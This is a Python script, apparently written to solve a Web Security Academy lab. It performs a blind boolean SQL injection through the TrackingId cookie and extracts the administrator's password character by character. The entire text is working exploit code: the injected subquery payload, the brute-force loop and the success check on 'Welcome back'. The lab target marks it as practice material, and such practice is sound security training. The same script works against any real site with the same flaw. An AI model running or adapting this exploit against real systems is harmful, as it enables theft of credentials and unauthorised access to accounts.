import requests
import string

url = "https://0a36003103597773822975c400e80054.web-security-academy.net"

characters = string.ascii_letters + string.digits
password = ""

session = requests.Session()

tracking_id = session.get(url).cookies.get("TrackingId")

for position in range(1, 21):
    for char in characters:
        guess = password + char

        payload = (
            f"' AND (SELECT SUBSTRING(password,1,{position}) FROM users WHERE username='administrator')='{guess}'--"
        )

        response = session.get(
            url,
            cookies={"TrackingId": tracking_id + payload}
        )

        if "Welcome back" in response.text:
            password += char
            print("Found:", password)
            break
    else:
        print("No matching character found at position", position)
        break

print("Password:", password)

